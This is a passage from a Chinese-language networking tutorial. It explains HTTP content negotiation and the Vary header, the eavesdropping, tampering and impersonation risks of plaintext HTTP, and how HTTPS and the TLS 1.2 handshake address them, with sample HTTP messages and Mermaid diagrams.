</ul>
</li>
<li><strong>应用场景</strong>: 国际化网站（如 Google, Apple）会根据这个头部，自动为用户展示对应语言的页面。</li>
</ul>
<p><strong>3. <code>Accept-Encoding</code>: 压缩编码协商</strong></p>
<ul>
<li><strong>作用</strong>: 告诉服务器客户端支持哪些解压缩算法，以便服务器可以对响应体进行压缩，减少传输大小。</li>
<li><strong>示例分析</strong>: <code>Accept-Encoding: gzip, deflate, br</code><ul>
<li>客户端告诉服务器，它能解压 <code>gzip</code>, <code>deflate</code>, <code>br</code> 这三种格式的数据。</li>
</ul>
</li>
<li><strong>应用场景</strong>: 现代浏览器都支持多种压缩算法。服务器会选择其中一种（通常是压缩率最高的 <code>br</code> 或最通用的 <code>gzip</code>）来压缩响应，并通过 <code>Content-Encoding</code> 响应头告知客户端。</li>
</ul>
<hr>
<h3 id="4-2-服务器如何根据请求头选择最佳表示"><a href="#4-2-服务器如何根据请求头选择最佳表示" class="headerlink" title="4.2 服务器如何根据请求头选择最佳表示"></a>4.2 服务器如何根据请求头选择最佳表示</h3><p>服务器在收到带有 <code>Accept-*</code> 头部的请求后，会执行以下逻辑来决定返回哪种表示：</p>
<ol>
<li><strong>解析 <code>Accept-\*</code> 头部</strong>: 服务器首先读取并解析客户端发送的所有内容协商相关的头部，了解客户端的能力和偏好（包括 <code>q</code> 值）。</li>
<li><strong>检查可用表示</strong>: 服务器检查对于请求的 URL，它自己拥有哪些可用的资源表示。<ul>
<li>例如，对于 <code>/article/123</code> 这个资源，服务器可能有：<ul>
<li><code>article.en.html</code> (英文 HTML)</li>
<li><code>article.fr.html</code> (法文 HTML)</li>
<li><code>article.en.json</code> (英文 JSON)</li>
<li>并且服务器配置了 <code>gzip</code> 和 <code>br</code> 压缩能力。</li>
</ul>
</li>
</ul>
</li>
<li><strong>匹配与选择</strong>: 服务器将客户端的偏好列表与自己的可用列表进行匹配，寻找<strong>质量值最高的最佳匹配项</strong>。<ul>
<li>服务器会遍历 <code>Accept-Language</code>, <code>Accept</code>, <code>Accept-Encoding</code> 等头部。</li>
<li>它会计算每个可用表示的“总得分”，并选择得分最高的那个。</li>
<li>例如，如果客户端请求 <code>Accept-Language: fr;q=1.0, en;q=0.8</code>，服务器会优先选择法文版本。</li>
</ul>
</li>
<li><strong>准备响应</strong>: 一旦确定了最佳表示，服务器就：<ul>
<li>准备相应的资源内容。</li>
<li>使用协商好的压缩算法（如果有）对响应体进行压缩。</li>
<li>在<strong>响应头部</strong>中设置相应的 <code>Content-*</code> 字段，明确告知客户端它最终发送的是什么版本：<ul>
<li><strong><code>Content-Type</code></strong>: 告知最终的 MIME 类型。</li>
<li><strong><code>Content-Language</code></strong>: 告知最终的语言。</li>
<li><strong><code>Content-Encoding</code></strong>: 告知使用的压缩算法。</li>
</ul>
</li>
</ul>
</li>
<li><strong>处理无法匹配的情况</strong>: 如果服务器没有任何表示能够满足客户端的 <code>Accept-*</code> 要求（例如，客户端只接受 <code>image/gif</code>，但服务器只有 <code>image/jpeg</code>），服务器会返回一个 <code>406 Not Acceptable</code> 状态码，表示无法提供可接受的表示。但在实际应用中，很多服务器会忽略 <code>Accept</code> 头，直接返回一个默认的表示（如 <code>text/html</code>），以避免给用户展示错误页面。</li>
</ol>
<p><strong>一个完整的例子</strong></p>
<ol>
<li><p><strong>客户端请求</strong> (一个希望看法文页面，支持 Brotli 压缩的浏览器)</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/news</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>fr, en;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>服务器的可用资源与能力</strong></p>
<ul>
<li>语言: 有 <code>fr</code> 和 <code>en</code> 两个版本的 <code>/news</code> 页面。</li>
<li>MIME 类型: 只有 <code>text/html</code>。</li>
<li>压缩: 支持 <code>gzip</code> 和 <code>br</code>。</li>
</ul>
</li>
<li><p><strong>服务器的决策过程</strong></p>
<ul>
<li><strong>语言</strong>: 客户端最偏好 <code>fr</code> (q&#x3D;1.0)，服务器正好有，选择 <code>fr</code>。</li>
<li><strong>MIME 类型</strong>: 客户端最偏好 <code>text/html</code> (q&#x3D;1.0)，服务器有，选择 <code>text/html</code>。</li>
<li><strong>编码</strong>: 客户端支持 <code>br</code>，服务器也支持，<code>br</code> 通常效率更高，选择 <code>br</code>。</li>
</ul>
</li>
<li><p><strong>服务器最终的响应</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Language</span><span class="punctuation">: </span>fr</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>br</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding, Accept-Language</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli"><span class="string">...</span> <span class="params">(经过 br 压缩的、法文版的 HTML 内容)</span> <span class="string">...</span></span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong><code>Vary</code> 头部</strong></p>
<p>注意上面响应中的 <code>Vary</code> 头部。这是一个非常重要的响应头，它告诉缓存服务器（如代理、CDN），对于同一个 URL，服务器的响应内容会<strong>因</strong>（Vary on）请求头中的 <code>Accept-Encoding</code> 和 <code>Accept-Language</code> 字段的不同而不同。缓存服务器必须将 URL 和这些请求头组合起来作为缓存的 key，以避免将法文版的页面错误地返回给一个请求英文版的用户。</p>
<hr>
<h1 id="五、HTTP-安全：从-HTTP-到-HTTPS-Security"><a href="#五、HTTP-安全：从-HTTP-到-HTTPS-Security" class="headerlink" title="五、HTTP 安全：从 HTTP 到 HTTPS (Security)"></a>五、HTTP 安全：从 HTTP 到 HTTPS (Security)</h1><h2 id="1-HTTP-的安全风险"><a href="#1-HTTP-的安全风险" class="headerlink" title="1. HTTP 的安全风险"></a>1. HTTP 的安全风险</h2><p>HTTP 协议以<strong>明文 (Plaintext)</strong> 的方式在客户端和服务器之间传输数据。这意味着，任何能够截获这条通信链路的中间方（如同一 Wi-Fi下的黑客、网络运营商、路由器等），都可以轻易地读取、修改甚至冒充通信内容。这主要带来了以下三大风险：</p>
<hr>
<h3 id="1-1-窃听风险-Eavesdropping-：通信内容为明文"><a href="#1-1-窃听风险-Eavesdropping-：通信内容为明文" class="headerlink" title="1.1 窃听风险 (Eavesdropping)：通信内容为明文"></a>1.1 窃听风险 (Eavesdropping)：通信内容为明文</h3><ul>
<li><strong>核心问题</strong>: HTTP 报文（包括请求头、请求体、响应头、响应体）在网络中传输时，完全没有经过任何加密。它们就像一张张写满了内容的“明信片”。</li>
<li><strong>工作原理</strong>: 当你通过一个公共 Wi-Fi（如咖啡馆、机场）访问一个 <code>http://</code> 网站时，你的数据包会经过多个网络节点才到达目标服务器。攻击者只需在其中任何一个节点上使用抓包工具（如 Wireshark），就能完整地截获并阅读你的所有通信内容。</li>
<li><strong>具体危害</strong>:<ul>
<li><strong>密码泄露</strong>: 在非加密的登录页面输入用户名和密码，攻击者可以直接看到你的账号密码。</li>
<li><strong>个人信息泄露</strong>: 提交包含姓名、身份证号、手机号、银行卡号的表单，这些信息都会被暴露。</li>
<li><strong>会话劫持</strong>: 许多网站使用 Cookie 来维持登录状态。如果 Cookie 被窃听，攻击者就可以利用这个 Cookie 冒充你，直接访问你的账户，无需知道密码。</li>
<li><strong>隐私暴露</strong>: 攻击者可以知道你正在浏览哪些网页、搜索了什么关键词、看了哪些商品。</li>
</ul>
</li>
</ul>
<p><strong>图解窃听风险</strong>:</p>
<pre><code class="highlight mermaid">sequenceDiagram
    participant 客户端 as 你的电脑
    participant 攻击者
    participant 服务器 as 网站服务器

    rect rgb(255, 224, 224)
        Note over 客户端,服务器: 传输通道: 不安全的网络 (如公共Wi-Fi)
        客户端-&gt;&gt;服务器: 发送明文数据 (账号: user, 密码: 123)
    end

    Note right of 攻击者: 监听并轻易截获&lt;br&gt;明文数据 user/123</code></pre>

<hr>
<h3 id="1-2-篡改风险-Tampering-：内容可被中间人修改"><a href="#1-2-篡改风险-Tampering-：内容可被中间人修改" class="headerlink" title="1.2 篡改风险 (Tampering)：内容可被中间人修改"></a>1.2 篡改风险 (Tampering)：内容可被中间人修改</h3><ul>
<li><strong>核心问题</strong>: 由于 HTTP 没有验证机制来确保数据的完整性，中间人不仅能窃听，还能在数据传输过程中<strong>任意修改</strong>内容，而通信的双方毫不知情。</li>
<li><strong>工作原理</strong>: 攻击者截获你的 HTTP 报文后，可以先不转发，而是修改其中的内容，然后再发送给真正的目的地。例如，修改服务器返回给你的网页内容，或者修改你发送给服务器的请求数据。</li>
<li><strong>具体危害</strong>:<ul>
<li><strong>植入广告&#x2F;恶意软件</strong>: 这是最常见的篡改。攻击者可以在你正常浏览的网页中强行插入弹窗广告、色情内容，甚至下载恶意软件的 JavaScript 脚本，导致你的电脑中毒。</li>
<li><strong>篡改下载文件</strong>: 你从一个官方网站下载软件，攻击者在传输途中将其替换为带病毒的版本。</li>
<li><strong>钓鱼攻击</strong>: 将你访问银行网站的请求，不知不觉地重定向到一个假的银行网站，或者在真实的网页上把登录表单的目标地址改成攻击者的服务器。</li>
<li><strong>修改交易信息</strong>: 修改你向服务器发送的转账请求，将收款人账号改成攻击者自己的账号。</li>
</ul>
</li>
</ul>
<p><strong>图解篡改风险</strong>:</p>
<pre><code class="highlight mermaid">sequenceDiagram
    participant 客户端 as 你的电脑
    participant 攻击者
    participant 服务器 as 网站服务器

    Note over 客户端,服务器: 用户发起正常的网页请求
    客户端-&gt;&gt;服务器: 请求网页 (GET /)

    rect rgb(255, 224, 224)
        Note over 攻击者: 攻击者位于通信链路中间
        服务器--&gt;&gt;攻击者: 1. 发送真实的网页
        Note over 攻击者: 截获并篡改内容&lt;br&gt;(插入广告/病毒脚本)
        攻击者--&gt;&gt;客户端: 2. 发送伪造的网页
    end

    Note over 客户端: 用户收到并渲染了被篡改的页面，&lt;br&gt;可能导致信息泄露或电脑中毒。</code></pre>

<hr>
<h3 id="1-3-冒充风险-Impersonation-：无法验证通信双方身份"><a href="#1-3-冒充风险-Impersonation-：无法验证通信双方身份" class="headerlink" title="1.3 冒充风险 (Impersonation)：无法验证通信双方身份"></a>1.3 冒充风险 (Impersonation)：无法验证通信双方身份</h3><ul>
<li><strong>核心问题</strong>: HTTP 协议中没有任何机制来验证通信对方的身份。客户端无法确认它正在对话的服务器就是它想访问的那个；同样，服务器也无法确认发起请求的客户端就是它所声称的那个。</li>
<li><strong>工作原理</strong>: 攻击者可以搭建一个伪装的服务器，并冒充成一个合法的网站（如银行网站）。通过 DNS 劫持等手段，当你尝试访问真正的银行网站时，你的请求被导向了这个假冒的服务器。由于界面一模一样，你很难分辨真伪。</li>
<li><strong>类比</strong>: <strong>电信诈骗</strong>。<br>你接到一个电话，对方声称是银行客服，要求你提供银行卡号和密码。你无法确认电话那头的人是否真的是银行客服，他很可能是一个冒充的骗子。</li>
<li><strong>具体危害</strong>:<ul>
<li><strong>钓鱼网站 (Phishing)</strong>: 这是冒充风险最直接、最危险的应用。用户在假冒的网站上输入敏感信息（如账号密码、支付信息），这些信息会直接被攻击者获取。这是前面两种风险的综合体现：攻击者<strong>冒充</strong>了服务器，然后对你输入的信息进行<strong>窃听</strong>。</li>
<li><strong>恶意服务器</strong>: 客户端（如一个 App）可能会被引导连接到一个恶意服务器，该服务器可以下发错误的指令或窃取 App 发送的数据。</li>
</ul>
</li>
</ul>
<p><strong>图解冒充风险 (钓鱼攻击)</strong>:</p>
<pre><code class="highlight mermaid">graph TD
    subgraph &quot;用户视角&quot;
        C[&quot;客户端&lt;br&gt;(你的电脑)&quot;]
    end

    subgraph &quot;攻击者的陷阱&quot;
        style FakeBank fill:#ffcccc,stroke:#333,stroke-width:2px
        FakeBank[&quot;假·银行服务器&lt;br&gt;fakebank.com&lt;br&gt;界面与真银行一模一样&quot;] --&gt; Attacker&#123;攻击者&lt;br&gt;获取账号密码&#125;
    end

    subgraph &quot;真实世界&quot;
        style RealBank fill:#cceeff,stroke:#333,stroke-width:2px
        RealBank[(&quot;真·银行服务器&lt;br&gt;realbank.com&quot;)]
        Note(用户本想访问这里) --&gt; RealBank
    end

    C -- &quot;以为在访问真银行...&quot; --&gt; FakeBank
    C -- &quot;DNS劫持/点击钓鱼链接&quot; --&gt; FakeBank</code></pre>

<p><strong>总结</strong>:</p>
<p>这三大风险——<strong>窃听、篡改、冒充</strong>——是环环相扣的。正是因为 HTTP 的明文、无校验、无身份认证的特性，才使得互联网早期充满了不安全感。为了解决这三大问题，<strong>HTTPS (HTTP Secure)</strong> 应运而生，它通过引入 SSL&#x2F;TLS 协议层，提供了<strong>加密、完整性校验和身份认证</strong>三大核心能力，从根本上保障了网络通信的安全。</p>
<hr>
<h2 id="2-HTTPS-是什么？"><a href="#2-HTTPS-是什么？" class="headerlink" title="2. HTTPS 是什么？"></a>2. HTTPS 是什么？</h2><p>在理解了 HTTP 的三大安全风险（窃听、篡改、冒充）之后，解决方案便呼之欲出——我们需要一个能够加密数据、防止篡改并能验证身份的协议。这个解决方案就是 <strong>HTTPS</strong>。</p>
<hr>
<h3 id="2-1-HTTPS-HTTP-SSL-TLS"><a href="#2-1-HTTPS-HTTP-SSL-TLS" class="headerlink" title="2.1 HTTPS &#x3D; HTTP + SSL&#x2F;TLS"></a>2.1 HTTPS &#x3D; HTTP + SSL&#x2F;TLS</h3><p>HTTPS 的全称是 <strong>Hypertext Transfer Protocol Secure</strong>，即“<strong>安全超文本传输协议</strong>”。</p>
<p>从字面意思上看，它就是 HTTP 的“安全版”。但它并不是一个全新的应用层协议，而是在原有的 HTTP 协议基础上，增加了一层安全层。这个安全层就是 <strong>SSL&#x2F;TLS</strong> 协议。</p>
<p>我们可以用一个简单的公式来理解它的结构：</p>
<p><strong>HTTPS &#x3D; HTTP + SSL&#x2F;TLS</strong></p>
<p>这个公式揭示了 HTTPS 的工作模式：</p>
<ul>
<li><strong>HTTP 协议本身没有改变</strong>: 请求行、请求头、请求体，以及响应行、响应头、响应体的格式和语义都和原来一样。</li>
<li><strong>增加了一个“安全壳”</strong>: HTTP 报文在发送前，不再是直接交给 TCP 层，而是先经过 SSL&#x2F;TLS 协议层进行“加密”和“打包”。</li>
<li><strong>通信过程</strong>:<ol>
<li><strong>应用层 (HTTP)</strong>: 浏览器准备好一个标准的 HTTP 请求报文。</li>
<li><strong>表示层&#x2F;安全层 (SSL&#x2F;TLS)</strong>: 这个 HTTP 报文被完整地交给 SSL&#x2F;TLS 协议处理。SSL&#x2F;TLS 会对整个报文进行加密，并附加一些用于验证完整性的信息（如 MAC 值）。</li>
<li><strong>传输层 (TCP)</strong>: SSL&#x2F;TLS 将加密后的数据包交给 TCP 层进行分段和传输。</li>
</ol>
</li>
</ul>
<p><strong>网络协议栈中的位置</strong>：</p>
<p>如果说 HTTP 直接运行在 TCP 之上，那么 HTTPS 就是运行在 SSL&#x2F;TLS 之上，而 SSL&#x2F;TLS 又运行在 TCP 之上。SSL&#x2F;TLS 就像一个插入到 HTTP 和 TCP 之间的“安全中间件”。</p>
<p><strong>HTTP 的通信模型</strong>:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">|   HTTP        | (应用层)</span><br><span class="line">+---------------+</span><br><span class="line">|   TCP         | (传输层)</span><br><span class="line">+---------------+</span><br><span class="line">|   IP          | (网络层)</span><br><span class="line">+---------------+</span><br><span class="line">|   Data Link   | (数据链路层)</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>

<p><strong>HTTPS 的通信模型</strong>:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">|   HTTP        | (应用层)</span><br><span class="line">+---------------+</span><br><span class="line">|   SSL/TLS     | (安全层) &lt;-- 新增的安全层</span><br><span class="line">+---------------+</span><br><span class="line">|   TCP         | (传输层)</span><br><span class="line">+---------------+</span><br><span class="line">|   IP          | (网络层)</span><br><span class="line">+---------------+</span><br><span class="line">|   Data Link   | (数据链路层)</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>

<p><strong>SSL (Secure Sockets Layer)</strong> 和 <strong>TLS (Transport Layer Security)</strong> 的关系:</p>
<ul>
<li>SSL 是由网景公司 (Netscape) 在 1990 年代发明的。</li>
<li>TLS 是 SSL 的标准化和升级版本。</li>
<li>SSL 3.0 之后，IETF 接管并发布了 TLS 1.0。目前，SSL 协议已因安全漏洞被弃用，我们现在所说的 SSL&#x2F;TLS 通常指的就是 TLS 协议 (目前主流版本是 TLS 1.2 和 1.3)。</li>
</ul>
<hr>
<h3 id="2-2-SSL-TLS-的作用：加密、身份验证、数据完整性"><a href="#2-2-SSL-TLS-的作用：加密、身份验证、数据完整性" class="headerlink" title="2.2 SSL&#x2F;TLS 的作用：加密、身份验证、数据完整性"></a>2.2 SSL&#x2F;TLS 的作用：加密、身份验证、数据完整性</h3><p>SSL&#x2F;TLS 协议通过一套复杂的握手流程和加密算法，精准地解决了 HTTP 的三大安全风险。它提供了以下三个核心安全保证：</p>
<h4 id="2-2-1-数据加密-Confidentiality-解决窃听风险"><a href="#2-2-1-数据加密-Confidentiality-解决窃听风险" class="headerlink" title="2.2.1 数据加密 (Confidentiality) - 解决窃听风险"></a>2.2.1 数据加密 (Confidentiality) - 解决窃听风险</h4><ul>
<li><strong>作用</strong>: 将应用层（HTTP）传输的数据进行加密，使得中间人即使截获了数据，也无法读懂其内容。</li>
<li><strong>实现方式</strong>: SSL&#x2F;TLS 采用<strong>混合加密 (Hybrid Encryption)</strong> 的方式。<ul>
<li>在<strong>握手阶段</strong>，使用<strong>非对称加密</strong>（如 RSA, ECDHE）来安全地协商出一个<strong>对称密钥</strong>。这个过程慢但安全。</li>
<li>在<strong>握手结束后的通信阶段</strong>，使用这个对称密钥和<strong>对称加密</strong>算法（如 AES, ChaCha20）来加密所有的 HTTP 报文。这个过程快而高效。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-2-2-身份验证-Authentication-解决冒充风险"><a href="#2-2-2-身份验证-Authentication-解决冒充风险" class="headerlink" title="2.2.2 身份验证 (Authentication) - 解决冒充风险"></a>2.2.2 身份验证 (Authentication) - 解决冒充风险</h4><ul>
<li><strong>作用</strong>: 验证通信对方的身份，确保你正在访问的确实是你想访问的服务器（如真正的银行网站），而不是一个假冒的钓鱼网站。</li>
<li><strong>实现方式</strong>: 主要通过 <strong>数字证书 (Digital Certificate)</strong> 和 <strong>数字签名 (Digital Signature)</strong> 实现。<ul>
<li>服务器会持有一个由权威的 <strong>证书颁发机构 (Certificate Authority, CA)</strong> 签发的数字证书。</li>
<li>这个证书包含了服务器的公钥、域名信息，以及 CA 对这些信息真实性的<strong>数字签名</strong>。</li>
<li>客户端（浏览器）内置了所有受信任的 CA 的根证书。当收到服务器证书时，浏览器会用对应的 CA 根证书来验证该证书的签名是否有效，以及证书中的域名是否与当前访问的域名匹配。如果验证通过，就证明服务器的身份是可信的。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-2-3-数据完整性校验-Integrity-解决篡改风险"><a href="#2-2-3-数据完整性校验-Integrity-解决篡改风险" class="headerlink" title="2.2.3 数据完整性校验 (Integrity) - 解决篡改风险"></a>2.2.3 数据完整性校验 (Integrity) - 解决篡改风险</h4><ul>
<li><strong>作用</strong>: 确保数据在传输过程中没有被中间人篡改。</li>
<li><strong>实现方式</strong>: 通过 <strong>消息认证码 (Message Authentication Code, MAC)</strong> 实现。<ul>
<li>发送方在发送数据时，会使用协商好的对称密钥和哈希算法（如 SHA-256）对原始数据计算出一个 MAC 值，并将其附加在加密数据包的末尾。</li>
<li>接收方收到数据后，先解密得到原始数据，然后用同样的方法独立计算出一个 MAC 值。</li>
<li>最后，比较自己计算出的 MAC 值和接收到的 MAC 值是否完全一致。<ul>
<li>如果一致，说明数据在传输过程中是完整的，未被篡改。</li>
<li>如果不一致，说明数据已被篡改，接收方会立即丢弃该数据包并中止连接。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>总结</strong>: HTTPS 通过在 HTTP 和 TCP 之间增加 SSL&#x2F;TLS 安全层，利用<strong>加密</strong>技术对抗<strong>窃听</strong>，利用<strong>身份验证</strong>技术对抗<strong>冒充</strong>，利用<strong>完整性校验</strong>技术对抗<strong>篡改</strong>，从而为我们的网络通信构建起一道坚实的安全防线。</p>
<hr>
<h2 id="3-SSL-TLS-握手过程"><a href="#3-SSL-TLS-握手过程" class="headerlink" title="3. SSL&#x2F;TLS 握手过程"></a>3. SSL&#x2F;TLS 握手过程</h2><p>SSL&#x2F;TLS 握手过程可以看作是通信双方在正式“加密对话”前的一系列“暗号对接”和“身份确认”步骤。整个过程涉及多次往返通信，主要可以分为以下四个阶段。</p>
<hr>
<h3 id="3-1-阶段一：客户端发起请求-Client-Hello"><a href="#3-1-阶段一：客户端发起请求-Client-Hello" class="headerlink" title="3.1 阶段一：客户端发起请求 (Client Hello)"></a>3.1 阶段一：客户端发起请求 (Client Hello)</h3><p>这是握手的开始。当你在浏览器地址栏输入 <code>https://www.google.com</code> 并回车时，浏览器（客户端）会向服务器的 443 端口发起一个 TCP 连接，连接建立后，立即发送第一个 TLS 报文，即 <strong><code>Client Hello</code></strong>。</p>
<p><code>Client Hello</code> 报文中包含了客户端希望与服务器沟通所需的所有信息，主要内容如下：</p>
<ul>
<li><strong>支持的 TLS 版本号</strong>: 客户端告诉服务器它最高支持哪个版本的 TLS 协议（如 TLS 1.2, TLS 1.3）。</li>
<li><strong>一个客户端生成的随机数 (Client Random)</strong>: 这是一个 32 字节的随机数，稍后将用于生成最终的会话密钥。</li>
<li><strong>支持的密码套件 (Cipher Suites) 列表</strong>: 这是<strong>最关键</strong>的信息之一。密码套件定义了一整套加密方案，包括：<ul>
<li>密钥交换算法 (如 <code>RSA</code>, <code>ECDHE</code>)</li>
<li>对称加密算法 (如 <code>AES_128_GCM</code>, <code>CHACHA20_POLY1305</code>)</li>
<li>哈希算法 (如 <code>SHA256</code>)<br>客户端会把自己支持的所有套件按偏好顺序列出来，让服务器从中选择一个。</li>
</ul>
</li>
<li><strong>支持的压缩算法列表</strong>: 客户端告诉服务器它支持哪些压缩方法（现在通常不使用）。</li>
</ul>
<hr>
<h3 id="3-2-阶段二：服务器响应与证书下发"><a href="#3-2-阶段二：服务器响应与证书下发" class="headerlink" title="3.2 阶段二：服务器响应与证书下发"></a>3.2 阶段二：服务器响应与证书下发</h3><p>服务器收到 <code>Client Hello</code> 后，会从中选择一套双方都支持的加密方案，并准备好自己的身份证明，然后向客户端发回一系列报文。</p>
<p>这一阶段通常包含三个报文：</p>
<ol>
<li><strong><code>Server Hello</code></strong>:<ul>
<li><strong>确认的 TLS 版本号</strong>: 服务器从客端支持的版本中选择一个自己也支持的最高版本。</li>
<li><strong>一个服务器生成的随机数 (Server Random)</strong>: 同样是一个 32 字节的随机数，也用于生成会话密钥。</li>
<li><strong>确认的密码套件</strong>: 服务器从客户端的列表中选择一个自己也支持且安全性较高的密码套件。</li>
</ul>
</li>
<li><strong><code>Certificate</code></strong>:<ul>
<li><strong>服务器的数字证书</strong>: 这是<strong>服务器身份的证明</strong>。服务器会将其证书（或证书链）发送给客户端。这个证书中包含了<strong>服务器的公钥</strong>、域名信息以及 CA 的签名。</li>
</ul>
</li>
<li><strong><code>Server Hello Done</code></strong>:<ul>
<li>一个简单的通知报文，告诉客户端：“好了，我这边该说的都说完了，该你了。”</li>
</ul>
</li>
</ol>
<hr>
<h3 id="3-3-阶段三：客户端验证证书、生成密钥"><a href="#3-3-阶段三：客户端验证证书、生成密钥" class="headerlink" title="3.3 阶段三：客户端验证证书、生成密钥"></a>3.3 阶段三：客户端验证证书、生成密钥</h3><p>客户端收到服务器的响应后，会执行一系列关键操作：</p>
<ol>
<li><strong>验证证书 (Authentication)</strong>:<ul>
<li>客户端会检查证书的<strong>有效期</strong>是否过期。</li>
<li>检查证书中的<strong>域名</strong>是否与当前正在访问的域名一致。</li>
<li>最重要的是，使用操作系统或浏览器内置的<strong>受信任的 CA 根证书</strong>，来验证服务器证书的数字签名是否真实有效。如果证书链中的任何一环验证失败，浏览器就会弹出“不安全”的警告。</li>
<li>如果证书验证通过，客户端就确认了服务器的身份是可信的，并从证书中<strong>取出了服务器的公钥</strong>。</li>
</ul>
</li>
<li><strong>生成预主密钥 (Pre-Master Secret)</strong>:<ul>
<li>客户端再生成一个<strong>第三个随机数</strong>，称为“<strong>预主密钥 (Pre-Master Secret)</strong>”。这个随机数是后续对称密钥的“种子”。</li>
</ul>
</li>
<li><strong>用服务器公钥加密预主密钥</strong>:<ul>
<li>为了安全地把这个预主密钥告诉服务器，客户端会使用刚刚从证书中获取的<strong>服务器公钥</strong>，对这个预主密钥进行<strong>非对称加密</strong>。</li>
<li>加密后的结果，只有持有<strong>服务器私钥</strong>的服务器才能解开。这就保证了即使被中间人截获，也无法得到预主密钥。</li>
</ul>
</li>
<li><strong>发送 <code>Client Key Exchange</code></strong>:<ul>
<li>客户端将这个<strong>加密后的预主密钥</strong>放在 <code>Client Key Exchange</code> 报文中发送给服务器。</li>
</ul>
</li>
<li><strong>生成会话密钥与发送 <code>Change Cipher Spec</code> 和 <code>Finished</code></strong>:<ul>
<li>此时，客户端同时拥有了三个关键的随机数：<strong>Client Random</strong>, <strong>Server Random</strong>, <strong>Pre-Master Secret</strong>。</li>
<li>客户端使用这三个随机数，通过一个<strong>伪随机函数 (PRF)</strong>，“计算”出本次会话所使用的<strong>对称密钥（也称会话密钥，Session Key）</strong>。</li>
<li>然后，客户端发送一个 <strong><code>Change Cipher Spec</code></strong> 报文，通知服务器：“我准备好了，从现在开始，我们都用刚算出来的对称密钥来加密通信了！”</li>
<li>紧接着，客户端会发送一个 <strong><code>Finished</code></strong> 报文。这个报文是<strong>第一个使用新生成的对称密钥加密</strong>的报文，它包含了之前所有握手消息的哈希值。服务器可以用它来验证握手过程是否被篡改。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="3-4-阶段四：服务器确认，建立安全通道"><a href="#3-4-阶段四：服务器确认，建立安全通道" class="headerlink" title="3.4 阶段四：服务器确认，建立安全通道"></a>3.4 阶段四：服务器确认，建立安全通道</h3><p>服务器收到客户端发来的一系列报文后，进行最后的工作：</p>
<ol>
<li><strong>解密预主密钥</strong>:<ul>
<li>服务器收到 <code>Client Key Exchange</code> 报文后，使用自己的<strong>私钥</strong>解密，得到客户端发送的<strong>预主密钥 (Pre-Master Secret)</strong>。</li>
</ul>
</li>
<li><strong>生成会话密钥</strong>:<ul>
<li>此时，服务器也拥有了 <strong>Client Random</strong>, <strong>Server Random</strong>, <strong>Pre-Master Secret</strong> 这三个相同的随机数。</li>
<li>服务器使用<strong>完全相同</strong>的伪随机函数，计算出与客户端一模一样的<strong>会话密钥</strong>。</li>
</ul>
</li>
<li><strong>验证与回应</strong>:<ul>
<li>服务器收到客户端的 <code>Change Cipher Spec</code> 后，也切换到使用新的会话密钥进行加密和解密。</li>
<li>服务器使用新的会话密钥解密客户端发来的 <code>Finished</code> 报文，并验证其中的哈希值是否正确。如果正确，说明握手过程未被篡改。</li>
<li>验证通过后，服务器也发送一个 <strong><code>Change Cipher Spec</code></strong> 和一个用新密钥加密的 <strong><code>Finished</code></strong> 报文给客户端，作为最终的确认。</li>
</ul>
</li>
</ol>
<p><strong>握手结束，加密通信开始</strong>:</p>
<p>客户端收到服务器的 <code>Finished</code> 报文并成功解密验证后，TLS 握手过程正式完成。此时，双方都已经拥有了相同的、安全的会话密钥。后续的所有 HTTP 请求和响应，都会使用这个会话密钥进行对称加密，从而建立起一条<strong>安全的数据通道</strong>。</p>
<p><strong>图解总结 (TLS 1.2 RSA 握手)</strong>:</p>
<pre><code class="highlight mermaid">sequenceDiagram
    participant Client as 客户端
    participant Server as 服务器

    %% 1. Client Hello
    Client-&gt;&gt;Server: Client Hello
    note right of Client: TLS版本, ClientRandom, 密码套件

    %% 2. Server Hello &amp; Certificate
    Server-&gt;&gt;Client: Server Hello, Certificate, Server Hello Done
    note left of Server: 确认版本, ServerRandom, 确认套件, 服务器证书+公钥

    %% 3. 客户端处理并发送密钥
    activate Client
    note over Client: 1. 验证证书，取出公钥&lt;br/&gt;2. 生成 Pre-Master Secret&lt;br/&gt;3. 用公钥加密 Pre-Master Secret&lt;br/&gt;4. 根据三个随机数生成会话密钥
    
